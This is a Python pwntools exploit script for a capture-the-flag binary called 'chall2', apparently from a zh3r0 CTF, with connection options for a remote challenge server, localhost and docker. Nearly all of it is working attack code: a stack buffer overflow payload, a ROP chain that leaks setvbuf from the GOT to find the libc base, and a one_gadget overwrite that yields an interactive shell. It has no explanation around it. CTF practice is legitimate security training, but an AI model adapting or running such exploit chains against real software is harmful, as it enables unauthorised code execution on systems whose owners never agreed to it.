#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall2"
LIBCNAME = ""

#hosts = ("asia.pwn.zh3r0.ml","localhost","localhost")
hosts = ("us.pwn.zh3r0.ml","localhost","localhost")
ports = (7412,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################


def hoge():
    pass

## exploit ###########################################

def exploit():
  global c

  addr = 0x601100
  pop_rdi = 0x400943
  main_addr = 0x400717
  write_off = 0x110140
  ogs = [0x4f2c5,0x4f322,0x10a38c]
  ishelphere = 0x601100
  setvbuf_off = 0x812f0

  for i in range(5):
    c.recvuntil(".")
    c.recvline()

  c.send("X"*0x28 + p8(0x17))

  c.recvline()
  c.send(p64(binf.got["setvbuf"]+0x20)+p64(0x400761)+p64(binf.got["setvbuf"])*0x5) # @helpishere
  c.recvline()
  c.send(p64(main_addr)+p64(ishelphere+0x10)+p64(main_addr)*2+p64(ishelphere)+p64(pop_rdi)+p64(binf.got["setvbuf"])+p64(0x40075c)) # stack overflow
  setvbuf_addr = unpack(c.recvline().rstrip().ljust(8,'\x00'))
  print("write: "+hex(setvbuf_addr))
  libcbase = setvbuf_addr - setvbuf_off
  print("libcbase: "+hex(libcbase))

  c.send(p8(0)*0x8)

  c.send(p64(libcbase+ogs[2])+p64(binf.plt["setvbuf"])*7)




## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
